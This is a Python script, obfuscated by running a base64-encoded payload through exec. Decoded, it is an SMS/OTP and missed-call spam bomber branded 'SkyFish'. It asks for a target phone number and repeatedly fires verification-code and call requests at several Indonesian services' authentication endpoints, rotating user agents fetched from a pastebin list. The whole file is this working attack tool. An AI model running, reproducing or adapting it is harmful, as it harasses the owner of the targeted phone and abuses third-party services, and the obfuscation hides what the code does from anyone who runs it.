import base64
exec(base64.b64decode('aW1wb3J0IG9zLHN5cyx0aW1lLHJlcXVlc3RzLHJhbmRvbSxqc29uLHJlDQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwDQpvcy5zeXN0ZW0oJ2NsZWFyJykNCmNsYXNzIGtudGwoKToNCiAgICBkZWYgX19pbml0X18oc2VsZik6DQogICAgICAgIHNlbGYudWE9cmVxdWVzdHMuZ2V0KCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvemtDWFRHY20nKS50ZXh0LnNwbGl0KCdcbicpDQogICAgICAgIHNlbGYuYWNhayA9IHJhbmRvbS5jaG9pY2Uoc2VsZi51YSkNCiAgICAgICAgc2VsZi5oaD1pbnB1dCgnXDAzM1swMG1Db3VudHJ5IENvZGU6IFwwMzNbOTZtJykgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgIHNlbGYubnVtYmVyPWlucHV0KCdcMDMzWzAwbVBob25lIE51bWJlcjogXDAzM1s5Nm0nKQ0KICAgICAgICBzZWxmLmdiPXNlbGYuaGgrc2VsZi5udW1iZXINCiAgICAgICAgc2VsZi5zbXAoKQ0KICAgICAgICB0aW1lLnNsZWVwKDMpDQogICAgZGVmIHNtcChzZWxmKToNCiAgICAgICAgICAgICAgICBzZWxmLmhkPXsNCiAgICAgICAgICAgICAgICAnRG9tYWluLU5hbWUnOiAnc3RnJywNCiAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9VVRGLTgnLA0KICAgICAgICAgICAgICAgICdIb3N0JzogJ3NydjMuc2FtcGluZ2FuLmNvLmlkJywNCiAgICAgICAgICAgICAgICAnQ29ubmVjdGlvbic6ICdLZWVwLUFsaXZlJywNCiAgICAgICAgICAgICAgICAnQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAnLA0KICAgICAgICAgICAgICAgICdVc2VyLUFnZW50JzogJ3tzZWxmLmFjYWt9J30NCiAgICAgICAgICAgICAgICBzZWxmLmRhdDE9anNvbi5kdW1wcyh7ImNvdW50cnlDb2RlIjpzZWxmLmhoLCJwaG9uZU51bWJlciI6c2VsZi5udW1iZXJ9KQ0KICAgICAgICAgICAgICAgIHIyPXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vc3J2My5zYW1waW5nYW4uY28uaWQvYXV0aC9jaGVjay1hdXRoLXN0YXRlJywgZGF0YT1zZWxmLmRhdDEsIGhlYWRlcnM9c2VsZi5oZCkNCiAgICAgICAgICAgICAgICByMz1yZXF1ZXN0cy5wb3N0KCdodHRwczovL3NydjMuc2FtcGluZ2FuLmNvLmlkL2F1dGgvZ2VuZXJhdGUtb3RwP2lzX3JlZ2lzdGVyPXRydWUnLCBkYXRhPXNlbGYuZGF0MSwgaGVhZGVycz1zZWxmLmhkKQ0KICAgICAgICAgICAgICAgIHNlbGYuc3NoKCkNCiAgICBkZWYgc3NoKHNlbGYpOg0KICAgICAgICAgICAgICAgIHI9cmVxdWVzdHMuZ2V0KCdodHRwczovL3d3dy5jaXRjYWxsLmNvbS9kZW1vLycpDQogICAgICAgICAgICAgICAgY2s9ci5jb29raWVzWydQSFBTRVNTSUQnXSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHc9ci50ZXh0DQogICAgICAgICAgICAgICAgaj1yZS5maW5kYWxsKHIibmFtZT1cImNzcmZfdG9rZW5cIiBpZD1cImNzcmZfdG9rZW5cIiB2YWx1ZT1cIiguKj8pXCIiLCB3KVswXSANCiAgICAgICAgICAgICAgICB1YT17DQogICAgICAgICAgICAgICAgJ0hvc3QnOiAnd3d3LmNpdGNhbGwuY29tJywNCiAgICAgICAgICAgICAgICAnY2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLA0KICAgICAgICAgICAgICAgICdvcmlnaW4nOiAnaHR0cHM6Ly93d3cuY2l0Y2FsbC5jb20nLA0KICAgICAgICAgICAgICAgICd1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzJzogJzEnLA0KICAgICAgICAgICAgICAgICdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJywNCiAgICAgICAgICAgICAgICAndXNlci1hZ2VudCc6ICd7c2VsZi5hY2FrfScsDQogICAgICAgICAgICAgICAgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45JywNCiAgICAgICAgICAgICAgICAncmVmZXJlcic6ICdodHRwczovL3d3dy5jaXRjYWxsLmNvbS9kZW1vLycsDQogICAgICAgICAgICAgICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNycsDQogICAgICAgICAgICAgICAgJ2Nvb2tpZSc6IGYnUEhQU0VTU0lEPXtja30nfQ0KICAgICAgICAgICAgICAgIGR0PXsnY2VsbE5vJzpzZWxmLmdiLCdjc3JmX3Rva2VuJzpqfQ0KICAgICAgICAgICAgICAgIHIxPXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd3d3LmNpdGNhbGwuY29tL2RlbW8vdmVyaWZpY2F0aW9uLnBocCcsIGRhdGE9ZHQsIGhlYWRlcnM9dWEpDQogICAgICAgICAgICAgICAgZHQxPXsnY2lkJzpzZWxmLmdiLCd0cnlpbmcnOicwJywnY3NyZl90b2tlbic6an0NCiAgICAgICAgICAgICAgICByMj1yZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy5jaXRjYWxsLmNvbS9kZW1vL21pc3NjYWxsYXBpLnBocCcsIGRhdGE9ZHQxLCBoZWFkZXJzPXVhKQ0KICAgICAgICAgICAgICAgIHNlbGYuc3NzKCkNCiAgICBkZWYgc3NzKHNlbGYpOg0KICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoNSkNCiAgICAgICAgICAgICAgICByPXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9pZC5qYWdyZXdhcmQuY29tL21lbWJlci9yZWdpc3Rlci8nKS5jb29raWVzWydQSFBTRVNTSUQnXQ0KICAgICAgICAgICAgICAgIHVhPXsNCiAgICAgICAgICAgICAgICAnSG9zdCc6ICdpZC5qYWdyZXdhcmQuY29tJywNCiAgICAgICAgICAgICAgICAnQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywNCiAgICAgICAgICAgICAgICAnQWNjZXB0JzogJyovKicsDQogICAgICAgICAgICAgICAgJ1gtUmVxdWVzdGVkLVdpdGgnOiAnWE1MSHR0cFJlcXVlc3QnLA0KICAgICAgICAgICAgICAgICdVc2VyLUFnZW50JzogJ3tzZWxmLmFjYWt9JywNCiAgICAgICAgICAgICAgICAnUmVmZXJlcic6ICdodHRwczovL2lkLmphZ3Jld2FyZC5jb20vbWVtYmVyL3JlZ2lzdGVyLycsDQogICAgICAgICAgICAgICAgJ0FjY2VwdC1MYW5ndWFnZSc6ICdpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNycsDQogICAgICAgICAgICAgICAgJ0Nvb2tpZSc6IGYnUEhQU0VTU0lEPXtyfSd9DQogICAgICAgICAgICAgICAgcnE9cmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9pZC5qYWdyZXdhcmQuY29tL21lbWJlci92ZXJpZnktbW9iaWxlL3tzZWxmLm51bWJlcn0vJywgaGVhZGVycz11YSkudGV4dA0KdHJ5Og0KICAgIHByaW50KCJcMDMzWzAwbVx0PFwwMzNbOTFtL1wwMzNbMDBtPlwwMzNbOTNtU3BhbSBcMDMzWzAwbTxcMDMzWzkxbS9cMDMzWzAwbT5cblwwMzNbMDBtXHRcMDMzWzQxOzFtICAgU2t5RmlzaCAgIFwwMzNbMDBtIikNCiAgICBrbnRsKCkNCiAgICBwcmludCgnXG5cMDMzWzAwbURvbmUuJykNCiAgICB3aGlsZSBUcnVlOg0KICAgICAgICAgY2I9aW5wdXQoJ1wwMzNbMDBtVHJ5IGFnYWluPyh5L3QpOicpDQogICAgICAgICBpZiBjYiA9PSAneSc6DQogICAgICAgICAgICBvcy5zeXN0ZW0oJ3B5dGhvbiBjYWxsLTEucHknKQ0KICAgICAgICAgZWxpZiBjYiA9PSAndCc6DQogICAgICAgICAgICBzeXMuZXhpdCgpDQogICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcHJpbnQoJ1wwMzNbMDBtV3JvbmcgSW5wdXQhJykNCmV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICBzeXMuZXhpdCgnRXJyb3IhJykNCmV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoNCiAgICAgICBzeXMuZXhpdCgnU3RvcCEnKQ0KDQo='))